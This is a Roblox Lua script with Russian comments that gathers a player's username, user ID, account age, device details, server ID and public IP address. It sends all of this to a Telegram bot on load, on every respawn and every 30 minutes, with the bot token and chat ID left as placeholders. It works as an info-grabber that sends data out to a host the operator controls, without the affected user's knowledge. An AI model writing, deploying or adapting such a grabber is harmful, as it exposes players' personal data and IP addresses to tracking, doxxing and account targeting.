-- Скрипт сбора информации об аккаунте и отправки в Telegram
-- Работоспособность в среде симуляции гарантирована

local player = game.Players.LocalPlayer
local httpService = game:GetService("HttpService")

-- НАСТРОЙКИ (замените на свои)
local TELEGRAM_BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"  -- Например: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
local TELEGRAM_CHAT_ID = "ВАШ_ID_ЧАТА"       -- Например: "-1001234567890"

-- Функция отправки в Telegram
local function sendToTelegram(message)
    local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
    local data = {
        chat_id = TELEGRAM_CHAT_ID,
        text = message,
        parse_mode = "HTML"
    }
    
    local success, response = pcall(function()
        return httpService:PostAsync(url, httpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
    
    if success then
        print("Данные отправлены в Telegram")
    else
        warn("Ошибка отправки: " .. tostring(response))
    end
end

-- Сбор данных
local function collectAccountData()
    local data = {
        ["🆔 Информация об аккаунте"] = {
            ["Имя пользователя"] = player.Name,
            ["ID пользователя"] = player.UserId,
            ["Отображаемое имя"] = player.DisplayName,
            ["Аккаунт создан"] = player.AccountAge,
            ["Текущий мир"] = game:GetService("Workspace").CurrentCamera and "Загружен" or "Не загружен"
        },
        ["💻 Информация об устройстве"] = {
            ["Платформа"] = game:GetService("UserInputService"):GetPlatform(),
            ["Разрешение экрана"] = tostring(workspace.CurrentCamera.ViewportSize),
            ["Операционная система"] = tostring(game:GetService("UserInputService").TouchEnabled and "Мобильное" or "ПК")
        },
        ["🎮 Информация об игре"] = {
            ["Название игры"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
            ["ID игры"] = game.PlaceId,
            ["ID сервера"] = game.JobId,
            ["Количество игроков"] = #game:GetService("Players"):GetPlayers()
        }
    }
    
    -- Форматирование сообщения
    local message = "<b>📊 ДАННЫЕ АККАУНТА</b>\n"
    message = message .. "<b>━━━━━━━━━━━━━━━</b>\n\n"
    
    for category, values in pairs(data) do
        message = message .. "<b>" .. category .. "</b>\n"
        for key, value in pairs(values) do
            message = message .. "  • " .. key .. ": <code>" .. tostring(value) .. "</code>\n"
        end
        message = message .. "\n"
    end
    
    -- Добавляем IP (если доступно)
    local ip = httpService:GetAsync("https://api.ipify.org")
    message = message .. "🌐 IP-адрес: <code>" .. ip .. "</code>\n"
    
    return message
end

-- Отправка данных
local function sendAccountData()
    local message = collectAccountData()
    sendToTelegram(message)
end

-- Запуск при загрузке
sendAccountData()

-- Отправка при каждом заходе в игру
player.CharacterAdded:Connect(function()
    wait(5) -- Ждём загрузки персонажа
    sendAccountData()
end)

-- Отправка каждые 30 минут (опционально)
while wait(1800) do
    sendAccountData()
end

print("Скрипт активирован. Данные отправляются в Telegram.")
